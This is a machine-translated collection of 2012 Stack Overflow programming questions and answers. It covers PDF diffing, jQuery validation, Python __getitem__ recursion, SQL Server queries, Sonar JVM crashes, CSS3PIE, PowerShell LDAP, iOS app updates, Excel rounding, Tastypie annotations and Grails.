    delta.txt 
```

然后简单地计算总像素与黑色像素的数量（对不起，这是 Unix/Linux/MacOSX 语法）：

```
 total_pixels=$(( $(cat delta.txt | wc -l) - 1))
 black_pixels=$(( $(grep black delta.txt | wc -l) -1 )) 
```

在用于上述插图的示例中，我得到

```
 total_pixels=500990
 black_pixels=8727 
```

当然，“理想”的结果是

```
 black_pixels=0 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-18T07:54:38.620

这个问题已经有一个公认的答案，但我想给我两分钱。我们制作了完美匹配您的场景[的 i-net PDFC](http://www.inetsoftware.de/products/pdf-content-comparer)。它已用于检查使用另一个报告工具制作的报告是否与我们的报告软件的输出相匹配。但它更强大。PDFC 不做的是：检查基于图像的像素完美度，但它会通过某些设置检查文档基于其内容是否基本（和视觉上）相同。比纯粹的基于像素的比较更强大。

i-net PDFC 可以可视化操作或基于命令行（例如批处理）并与连续集成系统一起使用。视觉组件甚至允许半透明地覆盖两个 PDF 文件，以让用户检查像素完美。

该软件刚刚完成测试版。试一试，让我们知道您的想法。（是的。我为制作这个的公司工作。）

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-17T21:44:02.893

[diffpdf](http://www.qtrac.eu/diffpdf.html)允许您并排比较两个 PDF。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-17T14:39:36.050

我建议使用 PDFCreator 将报告打印为 PNG 图像，然后您可以使用诸如 Paint .NET 之类的图形程序来使背景透明并将两个报告叠加在一起。

在一幅或两幅图像上使用一些颜色转换（例如，一个为红色，另一个为蓝色），它应该可以让您很好地看到差异。

你可以在这里找到 PDFCreator [http://de.pdfforge.org/pdfcreator](http://de.pdfforge.org/pdfcreator)。它完全免费使用。

# jquery - 验证表单加载

> ID：12460578
> 
> 赞同：0
> 
> 时间：2012-09-17T13:44:44.517
> 
> 标签：jquery

我正在尝试创建一个已填写的表格，该表格将在加载时进行检查。

当前设置是为 onblur 和 on keyup 设置的。但是当我尝试做时 `pass1.load(validatePass1);`，它没有用。

这是一个 jsfiddle：http: [//jsfiddle.net/8s3Hp/](http://jsfiddle.net/8s3Hp/)

感谢大家！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:49:58.637

在这个灵魂中，[http://jsfiddle.net/8s3Hp/3/](http://jsfiddle.net/8s3Hp/3/)，你会看到你的两个验证函数在准备函数的末尾被调用

```
 $(document).ready(function(){ 
      ...
      validatePass1();
      validatePass2();
    }); 
```

您的验证现在触发 onload。

阻止演示工作的另一件事是`form`变量未初始化，这阻止了任何后续代码的执行。我还在演示中更正了这一点，您应该会发现它按预期工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:48:49.643

```
//On blur
pass1.blur(validatePass1());
pass2.blur(validatePass2());
//On key press
pass1.keyup(validatePass1());
pass2.keyup(validatePass2()); 
```

不要忘记函数调用末尾的括号。

```
pass1.load(validatePass1()); 
```

# python - __getitem__ 或方括号用于递归数据结构

> ID：12460580
> 
> 赞同：5
> 
> 时间：2012-09-17T13:44:59.563
> 
> 标签：python, recursion

你好 StackOverflowers 同胞，

我正在实现一个二叉搜索树，其界面与 Python 中的 a 几乎相同`dict`（在有人问之前，我这样做是为了好玩，没有生产代码）。

为了从我的树中添加、检索和删除元素，我实现了`__getitem__`,`__setitem__`和`__delitem__`，效果很好。

问题是，由于这是一个递归数据结构，如果当前节点没有我要查找的键，我的`__getitem__`方法本身会调用树的左分支或右分支。`__getitem__`

`__getitem__`通过or进行此递归调用的最“pythonic”方式是什么`[]`？

例子：

```
def __getitem__(self, key):
    if key  == self.key:
        return self.value
    if key < self.key and self.left is not None:
        return self.left[key]
    if key > self.key and self.right is not None:
        return self.right[key]
    return None 
```

相对

```
def __getitem__(self, key):
    if key  == self.key:
        return self.value
    if key < self.key and self.left is not None:
        return self.left.__getitem__(key)
    if key > self.key and self.right is not None:
        return self.right.__getitem__(key)
    return None 
```

我知道它们的工作方式完全相同，一个是另一个的包装，但这是一个风格问题。

直接使用`[]`提供了更简洁的代码，更少的冗长，但可能会误导那些没有立即理解指令基本上是方法的递归调用的人，因此`__getitem__`消除了歧义。

请记住，我不是在谈论在外部调用中使用一个或另一个，显然`[]`应该在这种情况下使用，但只能在方法内部使用，作为递归调用。

你觉得呢？你有没有什么想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:48:23.740

使用 `[ ]`方式。它被设计成这样。如果您唯一担心的是误导您的代码的其他人，您可以通过在代码中添加注释来克服它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T13:48:44.487

我通常使用`[]`，但这真的没关系......我不知道关于这个问题的任何风格指南。

* * *

请注意，当您调用`__getitem__`父类时，您需要使用`__getitem__`而不是`[...]`. 例如

```
class getDict(dict):
   def __getitem__(self,key):
       if key in self:
          return dict.__getitem__(self,key)
       else:
          return None 
```

但这不是你在这里处理的......

*请不要使用此代码——它并不是一个好的代码示例（`return dict.get(self,key,None)`会更好）。这只是一个易于阅读的插图*

# sql - 如何在查询中为 MAX 函数设置自定义“排名”顺序？

> ID：12460584
> 
> 赞同：1
> 
> 时间：2012-09-17T13:45:02.463
> 
> 标签：sql, sql-server

我有一个包含“状态”整数字段的重复数据集。我想知道是否有某种方法可以将 MAX() 聚合函数“设置”为较低优先级。

我最终要在此数据集上运行查询以对重复项进行分组并选择“max”状态值不是“6”但返回 6 如果它是该值并且没有重复项这个记录。

使用 MAX 是解决此问题的最佳方法还是有更好的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:50:43.523

```
select coalesce(max(case when id = 6 then null else id end), max(id))
from (select 6 id union all select 2) a 
```

我同意 Dems 的改进建议，谢谢@Dems

```
select coalesce(max(nullif(id, 6)), max(id))
from (select 6 id union all select 2) a 
```

如果 'id' 永远不会为空，则 max(id) 可以替换为 6

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:53:10.667

```
declare @T table
(
  Grp int,
  Val int
)

insert into @T values
(2, 1),
(2, 2),
(2, 6),
(6, 6),
(7, 2),
(7, 6),
(7, 7)

select Val
from 
  (
    select Val,
           row_number() over(partition by Grp 
                             order by case when Val = 6 
                                        then 1 
                                        else 0 
                                      end, Val desc) as rn
    from @T 
  ) as T
where T.rn = 1 
```

结果：

```
Val
-----------
2
6
7 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:55:49.760

如果您使用的是 SQL Server，您可能想要探索排名函数。

[http://msdn.microsoft.com/en-us/library/ms176102.aspx](http://msdn.microsoft.com/en-us/library/ms176102.aspx)

[使用 Rank Over Partition 查找重复项](https://stackoverflow.com/questions/7569533/find-duplicates-using-rank-over-partition)

# php - sqlite_close() 期望参数 1 是资源，对象给出警告

> ID：12460585
> 
> 赞同：0
> 
> 时间：2012-09-17T13:45:05.650
> 
> 标签：php

我该如何解决这个警告？

```
 <?php
          $dir = 'sqlite:/home/ravi/public_html/db/FavoriteApps.db';
          $dbh= new PDO($dir) or die("cannot open the database");
          $query =  "SELECT * from app_category";
          foreach ($dbh->query($query) as $row)
          {

                $strName = $row[1];
                error_log("".  $strName );

                }
          sqlite_close( $dbh);
       ?> 
```

# java - 是否可以在 64 位系统 CentOS 上运行 Sonar？

> ID：12460590
> 
> 赞同：0
> 
> 时间：2012-09-17T13:45:22.603
> 
> 标签：java, centos, sonarqube

我刚刚在 CentOS 上安装了 Sonar 3.2（uname -a = Linux mydomain.com 3.2.20-1.29.6.amzn1.x86_64）。我正在使用 64 位版本的 Java ...

```
$ java -version 
java version "1.6.0_24" 
OpenJDK Runtime Environment (IcedTea6 1.11.3) (amazon-52.1.11.3.45.amzn1-x86_64) 
```

我想将 Sonar 安装为 Jenkins（构建集成服务器）的一部分，但是在尝试运行它时，它反复因“Java 运行时环境检测到致命错误”错误而死机。我说不出具体原因。Sonar 是否使用 64 位 JVM 运行？我该如何进一步解决这个问题？

下面是我运行的命令和我得到的最终错误......

```
[myuser@mydomain workspace]$ sudo /usr/local/apache-maven/apache-maven-3.0.4/bin/mvn -f "/var/lib/jenkins/jobs/Sales Client/workspace/pom.xml" -e -B sonar:sonar -Dsonar.jdbc.driver=com.mysql.jdbc.Driver -Dsonar.jdbc.url=jdbc:mysql://localhost:3306/sonar -Dsonar.host.url=http://localhost:9000
[INFO] Error stacktraces are turned on. 
[INFO] Scanning for projects... 
[WARNING] 
[WARNING] Some problems were encountered while building the effective model for org.mainco.subco:myclient:war:1.0 
[WARNING] 'dependencies.dependency.systemPath' for quickbase:quickbase:jar should not point at files within the project directory, ${project.basedir}/src/main/webapp/WEB-INF/lib/quickbase.jar will be unresolvable by dependent projects @ line 75, column 16 
[WARNING] 
[WARNING] It is highly recommended to fix these problems because they threaten the stability of your build. 
[WARNING] 
[WARNING] For this reason, future Maven versions might no longer support building such malformed projects. 
[WARNING] 
[INFO]                                                                         
[INFO] ------------------------------------------------------------------------ 
[INFO] Building myclient 1.0 
[INFO] ------------------------------------------------------------------------ 
[INFO] 
[INFO] --- sonar-maven-plugin:2.0:sonar (default-cli) @ myclient --- 
[INFO] Sonar version: 3.2 
[INFO] [14:43:11.995] Create JDBC datasource to url jdbc:mysql://localhost:3306/sonar 
[INFO] [14:43:14.081] Initializing Hibernate 
[INFO] [14:43:18.186] -------------  Analyzing myclient 
[INFO] [14:43:19.142] Selected quality profile : [name=Sonar way,language=java] 
[INFO] [14:43:19.409] Configure maven plugins... 
[INFO] [14:43:19.598] Compare to previous analysis (2012-09-14) 
[INFO] [14:43:19.680] Compare over 5 days (2012-09-09, analysis of 2012-09-14 11:35:22.0) 
[INFO] [14:43:19.719] Compare over 30 days (2012-08-15, analysis of 2012-09-14 11:35:22.0) 
[INFO] [14:43:19.857] Deleting /var/lib/jenkins/jobs/Sales Client/workspace/target/jacoco.exec 
[INFO] [14:43:20.042] JaCoCo agent (version 0.5.8.201207111220) extracted: /tmp/jacocoagent5605291050104287245.jar 
[INFO] [14:43:20.043] JVM options: -javaagent:/tmp/jacocoagent5605291050104287245.jar=destfile=target/jacoco.exec,excludes=*_javassist_* 
[INFO] [14:43:20.072] Initializer FindbugsMavenInitializer... 
[INFO] [14:43:20.078] Initializer FindbugsMavenInitializer done: 6 ms 
[INFO] [14:43:20.078] Execute maven plugin maven-surefire-plugin... 
[INFO] [14:43:20.078] Execute org.apache.maven.plugins:maven-surefire-plugin:2.10:test... 
[INFO]                                                                         
[INFO] ------------------------------------------------------------------------ 
[INFO] Building myclient 1.0 
[INFO] ------------------------------------------------------------------------ 
[INFO] 
[INFO] --- maven-surefire-plugin:2.10:test (default-cli) @ myclient --- 
[INFO] Surefire report directory: /var/lib/jenkins/jobs/Sales Client/workspace/target/surefire-reports 

------------------------------------------------------- 
 T E S T S 
------------------------------------------------------- 
Running org.mainco.subco.Sales.ProcessOrdersWorkerTest 
0    [main] DEBUG org.jboss.logging  - Logging Provider: org.jboss.logging.Log4jLoggerProvider 
182  [main] DEBUG org.hibernate.type.BasicTypeRegistry  - Adding type registration boolean -> org.hibernate.type.BooleanType@789934d4 
183  [main] DEBUG org.hibernate.type.BasicTypeRegistry  - Adding type registration boolean -> org.hibernate.type.BooleanType@789934d4 
... 
8428 [main] DEBUG org.hibernate.id.factory.internal.DefaultIdentifierGeneratorFactory  - Setting dialect [org.hibernate.dialect.HSQLDialect] 
8428 [main] DEBUG org.hibernate.id.factory.internal.DefaultIdentifierGeneratorFactory  - Setting dialect [org.hibernate.dialect.HSQLDialect] 
# 
# A fatal error has been detected by the Java Runtime Environment: 
# 
#  SIGSEGV (0xb) at pc=0x00007f65ec8627e7, pid=8357, tid=140075590440704 
# 
# JRE version: 6.0_31-b04 
# Java VM: Java HotSpot(TM) 64-Bit Server VM (20.6-b01 mixed mode linux-amd64 compressed oops) 
# Problematic frame: 
# V  [libjvm.so+0x7a27e7]  ContiguousSpace::prepare_for_compaction(CompactPoint*)+0x227 
# 
# An error report file with more information is saved as: 
# /var/lib/jenkins/jobs/Sales Client/workspace/hs_err_pid8357.log 
# 
# If you would like to submit a bug report, please visit: 
#   http://java.sun.com/webapps/bugreport/crash.jsp    
# 
/bin/sh: line 1:  8357 Aborted                 /usr/java/jdk1.6.0_31/jre/bin/java '-javaagent:/tmp/jacocoagent5605291050104287245.jar=destfile=target/jacoco.exec,excludes=*_javassist_*' -jar '/var/lib/jenkins/jobs/Sales Client/workspace/target/surefire/surefirebooter9057179906457468987.jar' '/var/lib/jenkins/jobs/Sales Client/workspace/target/surefire/surefire9129544007090882593tmp' '/var/lib/jenkins/jobs/Sales Client/workspace/target/surefire/surefire1194130731343095454tmp' 

Results : 

Tests run: 0, Failures: 0, Errors: 0, Skipped: 0 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T17:41:25.527

这对我有用，在这台机器上同时运行 Sonar 和 Jenkins：

> $ uname -a Linux {HOSTNAME} 2.6.18-274.12.1.el5 #1 SMP Tue Nov 29 13:37:46 EST 2011 x86_64 x86_64 x86_64 GNU/Linux
> 
> $ java -version java version "1.6.0_20" OpenJDK Runtime Environment (IcedTea6 1.9.10) (rhel-1.23.1.9.10.el5_7-x86_64) OpenJDK 64-Bit Server VM（build 19.0-b09，混合模式）

我们运行 ant 构建，而不是 maven。我们将测试和覆盖率作为 ant 目标运行，并将声纳作为单独的目标加载，而不是尝试通过声纳运行测试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T10:59:27.207

我想这是由[SONAR-3701](http://jira.codehaus.org/browse/SONAR-3701)引起的。

# css - 在 CSS3PIE 中调整背景图像大小

> ID：12460593
> 
> 赞同：1
> 
> 时间：2012-09-17T13:45:29.377
> 
> 标签：css, image

您好，我正在尝试在 IE8 中创建与此图片相同的效果（适用于 FF 15 和 Chrome，但不适用于 IE8）

[比较 http://imageshack.us/a/img526/4466/10274965.jpg](http://imageshack.us/a/img526/4466/10274965.jpg)

在我的代码中，我使用了 2 张图片 pa.png (190px x 500px) 和 ad.jpg (210px x 50px)。正如您在图像上看到的，PIE 更改了边框半径，但没有缩放图像。

我有一个 index.php 文件，其中包含 left.php

我的代码是

```
 <div id="lefti1">
        <div id="adm1" >
             <p class="m1">Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo. Quisque sit amet est et sapien ullamcorper pharetra. Vestibulum erat wisi, condimentum sed, commodo vitae, ornare sit amet, wisi. Aenean fermentum, elit eget tincidunt condimentum, eros ipsum rutrum orci, sagittis tempus lacus enim ac dui. Donec non enim in turpis pulvinar facilisis. Ut felis. Praesent dapibus, neque id cursus faucibus, tortor neque egestas augue, eu vulputate magna eros eu erat. Aliquam erat volutpat. Nam dui mi, tincidunt quis, accumsan porttitor, facilisis luctus, metus koniec</p>
        </div>
    </div> 
```

和 CSS

```
#lefti1 {
width:210px;
background: url(pa.png) no-repeat 50% 50%;
background-size:210px 100%;
margin:0 auto;
padding:0px 0px;
position:relative;
behavior: url(PIE.htc);
border-radius:16px 16px 16px 16px;
-pie-background: url(pa.png) no-repeat 50% 50% / 210px 100%;   
}   
.m1    {
text-align:justify;
margin:0 auto;
padding:55px 10px;
}
#adm1 {
width:210px;
height:auto;
background: transparent url(ad.jpg) no-repeat center 0px;
background-size:210px 50px;
border-radius:16px 16px 0 0;
border:none;
position:relative;
z-index:1;
behavior: url(PIE.htc);    
} 
```

Iwanto 缩放*pa.png*以填充*div id="lefti1"*。我试图添加一个*.htaccess*文件*background-size:cover*但没有任何帮助。任何人都可以看到并指出我的错误吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:55:17.110

[http://css3pie.com/documentation/supported-css3-features/#pie-background](http://css3pie.com/documentation/supported-css3-features/#pie-background)

> […] 在 IE 6-8 中呈现时，当前将忽略背景速记的以下方面：
> 
> *   背景大小（将始终使用图像的固有大小）

# powershell - 我怎样才能让这个脚本输出专有名称？

> ID：12460597
> 
> 赞同：0
> 
> 时间：2012-09-17T13:45:36.987
> 
> 标签：powershell

我添加了我认为专有名称应该是“dn”的内容，但它返回空白。givenname 和 sn 字段返回 OK。

谢谢。

```
$Dom = 'LDAP://DC=oakland;DC=local'
$Root = New-Object DirectoryServices.DirectoryEntry $Dom
$i=0
$selector = New-Object DirectoryServices.DirectorySearcher
$selector.SearchRoot = $root

$adobj= $selector.findall() | where {$_.properties.objectcategory -match "CN=Person"}

foreach ($person in $adobj){
    $prop=$person.properties
    $i++
    Write-Host "$($prop.givenname) $($prop.sn) $($prop.dn)" 
}

"Total $i" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:39:27.900

你似乎在寻找`$prop.distinguishedname`.

# sql-server - 大型 SQL Server 数据库超时 PHP Web 应用程序

> ID：12460602
> 
> 赞同：0
> 
> 时间：2012-09-17T13:45:45.437
> 
> 标签：sql-server, performance, large-data

我们正在运行一个使用 PHP 创建的基于 Web 的医院系统。由于数据库的大小，该系统最初很快，但现在它变得很慢。

以下是一个示例查询

```
select pa.id, pa.date as date, pa.visitno, pa.receiptno, pa.debitnoteno, pad.id as padid,
 pad.serviceid as serviceid, pad.waitno, pa.paytype, s.id as doctorid, s.fullname as
 doctorname, p.id as patientid, p.name as patient, p.regno, p.age, p.gender, p.doc,
 p.department, p.telno, p.address, pa.ins_prov_id, ip.name as provider,
 pa.sicksheet_billcode as billcode, ds.id as serviceid, ds.name as servicename, ds.departid
 as departid, ds.servicetype as servicetype, pad.charge, pad.status as status, ts.id as
 timeslotid, ts.name as timeslot, pad.treatment, sd.anesthesiologist, sd.hospitalcharge,
 sd.anesthcharge from patientappointments as pa
INNER JOIN patientappdetails as pad ON pa.id = pad.patappid 
INNER JOIN patients as p ON pa.patid = p.id 
INNER JOIN staffs as s ON pad.doctorid = s.id 
LEFT JOIN departmentalservices as ds ON pad.serviceid = ds.id 
LEFT JOIN insproviders as ip ON pa.ins_prov_id = ip.id 
LEFT JOIN timeslots as ts ON pad.timeslotid = ts.id 
LEFT JOIN surgerydetails as sd ON sd.appdetid = pad.id 
where 1 = 1 and pa.date >= '01.Jul.2012' and ds.departgroupid = 16 and pad.charge != 0 
```

如您所见，我们查询的大小（称它们为未优化）显示了患者、医生、所接受的服务、他来自什么时间和哪个公司。所以现在我们创建了在一段时间内确实有帮助的索引，但现在速度又变慢了。在 localhost 上运行系统会导致结果在大约 15 秒后出现，而在实时系统上，**它会超时**。

您能否提出任何提高速度的方法以及如何实现它们。

仅供参考，每个表中的行如下：

*   患者应用程序详细信息 - 195k
*   患者 - 34k
*   员工 - 200
*   部门服务 - 700
*   提供者 - 2800

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:05:44.930

通常，在您有很多连接的情况下，尤其是在将大量记录连接到少数记录（每个患者的预约到医生/员工详细信息等）的情况下，单独获取这些记录并将它们连接到 SQL 服务器之外是有意义的 -在应用服务器上。
我建议一次获取医生/员工/部门服务（可能还有 insproviders）详细信息，并将它们存储在应用程序服务器上的应用程序缓存中。然后，您的 SQL 查询将只需要获取患者和约会的详细信息，这将导致结果集相当小（更短的记录）。
考虑到您选择的大小（我假设它是某种报告功能），您应该在这里考虑分页和/或批处理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:07:12.400

好吧，让我们从索引开始。我假设您已经为 patienappointments.date 创建了一个索引，它属于集群类型。我还假设您在 ds.departgroupid 上有一个索引。你错过了几个表的大小，但我猜那些左连接是罪魁祸首。查询执行计划应该会产生一些有趣的结果（如果你可以在这里发布它可能有助于消除一些疑问）。如果您在日期字段上没有索引，那么您将面临顺序表扫描（读取整个表），这真的很糟糕。还要检查那些左连接，因为其中一个可能会弄乱查询计划。

根据经验，我会这样做：

1.  仅使用内部连接运行查询，并测试所需时间
2.  获取一个查询计划，看看它是否可以优化（主要通过添加索引）
3.  使用 WHERE 语句运行步骤 1 的查询
4.  查询计划和优化
5.  一次添加一个左连接
6.  查询计划和优化

等等……

即便如此，您的查询最终可能会花费大量时间，在这种情况下，您可以做两件事

1.  添加更多硬件（拥有更多内存和更好的磁盘永远不会有坏处）
2.  根据优化的输入，使用时态表将查询分成更小的部分，优化器可以加速好的部分。

# ios - iOS 自动更新

> ID：12460603
> 
> 赞同：5
> 
> 时间：2012-09-17T13:45:46.597
> 
> 标签：ios, cordova, appstore-approval, auto-update

提交更新并等待审核需要 10 天。我在 iPad 上安装的一款农场游戏在运行时显示“正在下载更新”。

*   像这样在 iOS 应用程序中实现更新是个好主意吗？
*   苹果允许吗？
*   你知道除了农场应用程序之外的应用程序吗？

我正在考虑PhoneGap。我可以下载新版本的 phonegap 解压并运行。

所以我会直接拨号添加功能，甚至将不同的功能推送给不同的客户端。这也是克服加密限制的一种方法。

目前尚不清楚具有 https 链接、资源的 HTML 代码是否必须经过认证才能从美国出口。

应用程序可以从欧盟服务器下载 HTML/JS 代码以克服美国出口限制。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-24T11:23:28.560

> 像这样在 iOS 应用程序中实现更新是个好主意吗？

这当然是个好主意，但这是被禁止的。但是，您可以下载一些实际上不是可执行文件的内容。

> 苹果允许吗？

它不是。您不能下载任何形式的代码或二进制文件并在设备上运行它。我会给你一些参考，但它会违反苹果和开发者之间的保密协议。请检查您与 Apple 的协议。

> 你知道除了农场应用程序之外的应用程序吗？

他们下载内容，但不确定添加功能的二进制文件。

在使用Phonegap 的场景中，您可以下载不是可执行文件的HTML/JS 文件。但是由于 Phonegap 的性质，您可以使用这些文件来执行代码。因此，恕我直言，我怀疑您不会通过 App 审查。

此外，您需要将这些文件下载到您的`www`文件夹中。甚至，据我所知，在运行时不允许在文件夹之外**写入。**`documents`正因为如此，我的应用被拒绝了。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-17T23:24:13.077

好吧，正如我所见，您可以通过应用内购买 API 做到这一点，不是吗？

我从 iOS 开发者计划许可协议中获取的

> 1.1 您只能将应用内购买 API 用于使最终用户能够访问或接收您在您的应用程序中提供的内容、功能或服务（例如，数字书籍、附加游戏关卡、访问回合转地图服务）。您不得使用应用内购买 API 来提供在您的应用程序之外使用的商品或服务。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-27T15:24:13.540

这是一个迟到的答案，我也对“你不能下载任何形式的代码或二进制文件并在设备上运行它”这个术语感到困惑，但事实证明我的应用程序多次通过了审查，没有一次被拒绝。它甚至不是一个PhoneGap 应用程序，它只是一个带有离线缓存的在线网络应用程序。

# excel - 需要一些公式帮助来使用 excel 准备工资

> ID：12460609
> 
> 赞同：1
> 
> 时间：2012-09-17T13:45:57.830
> 
> 标签：excel

我需要一些帮助才能计算出工资的最后两位小数点，如下所示

1.  如果 00 到 12，那么 00
2.  如果 13 到 37，则向上取整到 25
3.  如果 38 到 62，则向上取整到 50
4.  如果 63 到 87，则向上取整到 75
5.  如果 88 或更多，则向上取整到 100

例子：

```
By Apllying the above principles

     if the amount is  79.109 have to change it to  79.100  
     if the amount is 132.528 have to change it to 132.525
     if the amount is 258.739 have to change it to 258.750
     if the amount is 452.264 have to change it to 452.275 
```

如果金额为 124.998，则必须将其更改为 125.000

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:58:53.693

使用 A1 中的数据在 B1 中尝试此公式以根据需要进行舍入

`=ROUND(A1*4,1)/4`

编辑： MROUND 是另一种可能性，即

`=MROUND(A1,0.025)`

....但 MROUND 只是 Excel 2007 及更高版本中的原生 excel 函数（在早期版本的 Analysis ToolPak 中）

# django - 注释在 Django/Tastypie 中被忽略

> ID：12460613
> 
> 赞同：7
> 
> 时间：2012-09-17T13:46:07.647
> 
> 标签：django, annotations, tastypie

在我的 Tastypie 资源中，我正在注释我的查询集，但我没有看到该注释流向 JSON Tastypie 生成并传回。代码很简单：

```
class CompetitionResource(ModelResource):
    total_tickets = fields.IntegerField(readonly=True)

    class Meta:
        queryset = Competition.objects.all().annotate(total_tickets=Count('ticket__ticketownership__user__id', distinct=True)) 
```

我在查询集中生成和注释的那个计数根本不会出现在最终的 JSON 中。最终的 JSON 有一个 total_users 字段（因为我在 ModelResource 中声明了一个），但它为空。我是否遗漏了任何明显的东西来确保通过这样的注释？如果没有，有什么方法可以解决这个问题？

一种方法是在我的模型中创建一个属性，然后将我的 ModelResource 中的 total_users 字段绑定到该属性。但这可能会导致我从数据库中提取的每个竞赛的计数查询，这并不好。我想在一个注释类型的查询中做到这一点。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-18T14:02:25.617

好，我知道了。您可以简单地使用可以添加到 ModelResource 的自定义 dehydrate_[field name] 方法。对于每个 ModelResource 字段，Tastypie 会检查您是否指定了 dehydrate_[field name] 方法，如果您指定了，它会在将对象处理成包时调用该方法（然后以 JSON 或 XML 或其他形式输出）。这个 dehydrate_[field name] 方法获取 Tastypie 在此之前为该特定对象创建的包。好消息是这个bundle中有原始对象，在bundle.obj下。并且该对象仍将具有您在 get_object_list 中提供的原始注释（如上面的答案所示）。所以你可以使用下面的代码。

```
class CompetitionResource(ModelResource):
    total_tickets = fields.IntegerField(readonly=True)

    class Meta:
        queryset = Competition.objects.all()

    def get_object_list(self, request):
        return super(CompetitionResource, self).get_object_list(request).annotate(total_tickets=Count('ticket__ticketownership__user__id', distinct=True))

    def dehydrate_total_tickets(self, bundle):
        return bundle.obj.total_tickets 
```

无论您从自定义 dehydrate_[field name] 方法返回什么，都将作为该字段的最终值正确存储在该对象的包中，然后正确处理为输出。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-07-12T16:58:16.097

它没有出现在文档中，但是查看源代码有一个*属性*参数可以传递给字段声明，该字段声明可用于将其绑定到模型实例的属性。

> 可选地接受一个`attribute`，它应该是一个实例属性的字符串，或者 `dehydrate`在`hydrate`. 默认为`None`，表示将手动访问数据。

因此，对于您的示例，以下内容应该可以解决问题。

```
class CompetitionResource(ModelResource):
    total_tickets = fields.IntegerField(readonly=True, attribute='total_tickets')

    class Meta:
        queryset = Competition.objects.all().annotate(total_tickets=Count('ticket__ticketownership__user__id', distinct=True)) 
```

脱水解决方案适用于使用值填充发送的对象，但不允许您轻松利用 Tastypie 的一些其他功能，例如内置过滤（我相信排序）。使用带有属性参数的字段定义可以。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-17T18:22:39.647

我认为您的问题可能与 Tastypie 文档中给出的警告有关[`queryset`](http://django-tastypie.readthedocs.org/en/latest/cookbook.html#per-request-alterations-to-the-queryset)：

> 如果您在其中放置任何可调用对象，它们只会被评估一次（当 Meta 类被实例化时）。这尤其会影响与日期/时间相关的事物。请参阅 :ref:cookbook 以了解解决此问题的方法。

查看食谱中的[相关部分](http://django-tastypie.readthedocs.org/en/latest/cookbook.html#per-request-alterations-to-the-queryset)，我认为您应该尝试以下操作：

```
class CompetitionResource(ModelResource):
    total_users = fields.IntegerField(readonly=True)

    class Meta:
        queryset = Competition.objects.all()

    def get_object_list(self, request):
        return super(CompetitionResource, self).get_object_list(request).annotate(total_tickets=Count('ticket__ticketownership__user__id', distinct=True)) 
```

# oracle - Grails .findAll() 多次返回相同的数据库行，这可能是什么原因？

> ID：12460616
> 
> 赞同：1
> 
> 时间：2012-09-17T13:46:10.437
> 
> 标签：oracle, rest, grails, groovy, hql

我有一个相当普通的 Oracle 表，有七行。每行都有不同的值，有一个唯一的键可以防止大多数列具有相似的数据。

在 Grails 控制器中，我正在运行以下代码：

```
else if (request.method == "GET" && params.term) {
  def a = WaiverExemption.findAll("from WaiverExemption as e where e.exemptionTermCode.id = ?", [parseLong(params.term)]) as JSON
  a.render(response)
  return false
} 
```

浏览器对此提出了正确的请求。它传入一个有效术语，在 IntelliJ 调试器中我可以看到该术语是正确的。直到上周的某个时候，这段特殊的代码片段才能正常工作……我的麻烦与让 Backbone 和 jQuery 使用返回的 json 数据有关。

现在，它不是返回我期望的 7 行数据，而是返回同一行 7 次。这一行恰好是 Oracle 客户端中返回的第一行（尽管由于我没有使用任何 order by，从技术上讲，它根本不是第一行......不能保证订单等等）。

到目前为止，我已经完成了多个“grails clean”。我当然已经多次停止并重新启动应用程序，并且我在调试和常规执行中都尝试过。

此代码的唯一更改是在域类中添加了另一列。但时间与事情开始搞砸的时间并不相符。新列实际上是 Oracle 的 ROWID，我没想到它会起作用，但确实使另一个问题更容易解决。但是，删除它并不能恢复它的工作。

谁能解释这种行为？

[编辑] 按要求修复 config.groovy 后的调试结果：

```
2012-09-17 10:26:02,675 [http-bio-8080-exec-7] DEBUG hibernate.SQL  - select waiverexem0_.EXEMPTION_TERM_CODE as EXEMPTION1_26_, waiverexem0_.exemption_activity_date as exemption2_26_, waiverexem0_.exemption_classification as exemption3_26_, waiverexem0_.exemption_code as exemption4_26_, waiverexem0_.exemption_pay_type as exemption5_26_, waiverexem0_.exemption_priority as exemption6_26_, waiverexem0_.ROWID as ROWID7_26_, waiverexem0_.exemption_term_code as exemption1_26_, waiverexem0_.exemption_user_id as exemption8_26_ from TT_ST_GRADUATE_EXEMPTION waiverexem0_ where waiverexem0_.exemption_term_code=? 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:19:51.407

我以前没有见过这个特定的问题，但是如果我遇到它，我会像这样调试它：

*   打开 Hibernate SQL 调试，这样我就可以看到 Grails 向 Oracle 抛出的 SQL。在 Config.groovy log4j 配置中，将“org.hibernate.SQL”添加到调试部分。然后将此 SQL 从 IntelliJ 控制台复制粘贴到连接到 Oracle 的 SQL 客户端中，然后查看它返回的结果。
*   在控制器中运行查询之前，请执行`println params.term`
*   在呈现响应之前打印 findAll 的结果。

